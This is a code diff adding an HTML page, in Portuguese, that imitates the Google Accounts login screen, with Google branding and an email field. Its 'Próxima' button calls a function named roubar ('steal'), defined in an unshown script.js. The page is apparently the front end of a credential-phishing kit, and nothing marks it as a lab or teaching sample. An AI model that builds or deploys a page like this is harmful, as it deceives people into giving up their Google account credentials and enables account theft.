@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Login - Contas do Google</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #F0F4F9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 800px;
+            height: 400px;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 25px;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .left {
+            position: relative;
+            bottom: 80px;
+            text-align: left;
+        }
+        .logo {
+            margin-bottom: 10px;
+        }
+        .logo img {
+            width: 60px;
+        }
+        .title {
+            font-size: 28pt;
+            margin-bottom: 10px;
+            color: #2b2c2f;
+        }
+        .subtitle {
+            font-size: 12pt;
+            margin-bottom: 30px;
+            color: #2a2b2c;
+        }
+        .right {
+            text-align: right;
+            max-width: 50%;
+            flex-grow: 1;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            margin-right: 187px;
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 80%;
+            padding: 10px;
+            height: 50px;
+            font-size: 12pt;
+            border: 2px solid #cacccf;
+            border-radius: 4px;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        .form-actions {
+            position: relative;
+            top: 80px;
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            margin-left: 130px;
+            width: 60%;
+
+        }
+        .criar{
+            padding: 5px 20px;
+            font-size: 14px;
+            font-weight: bolder;
+            color: #1a73e8;
+            background-color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        .criar:hover {
+            background-color: #f2f7fd;
+        }
+        .prox{
+            padding: 10px 25px;
+            font-size: 14px;
+            font-weight: bolder;
+            color: #fff;
+            background-color: #1a73e8;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        .prox:hover {
+            background-color: #1765cc;
+        }
+        .link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+     <script src="script.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <div class="logo">
+                <img src="https://t.ctcdn.com.br/lvns56iaSMyHvyTur4JeYS_NYeY=/i606944.png" alt="Google Logo">
+            </div>
+            <div class="title">Fazer login</div>
+            <div class="subtitle">Use sua Conta do Google</div>
+        </div>
+        <div class="right">
+            <form>
+                <div class="form-group">
+                    <label for="email">Email ou telefone</label>
+                    <input type="text" id="email" name="email" required>
+                </div>
+                <a href="#" class="link">Esqueceu seu email?</a>
+                <div class="form-actions">
+                    <button type="submit" class="criar">Criar Conta</button>
+                    <button type="submit" class="prox" onclick="roubar()">Próxima</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js" integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy" crossorigin="anonymous"></script>
+</body>
+</html>
